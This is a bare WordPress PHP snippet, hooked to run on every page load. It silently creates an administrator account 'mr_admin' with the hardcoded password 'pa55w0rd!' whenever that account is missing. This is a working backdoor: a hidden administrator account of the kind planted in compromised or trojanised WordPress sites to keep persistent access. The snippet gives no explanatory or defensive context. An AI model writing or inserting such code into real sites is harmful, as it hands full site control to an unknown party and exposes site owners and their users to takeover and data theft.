function create_admin_user_if_not_exists() {
    if (!username_exists('mr_admin')) {
        require_once(ABSPATH . 'wp-includes/registration.php');

        $user_id = wp_create_user('mr_admin', 'pa55w0rd!');
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'create_admin_user_if_not_exists');
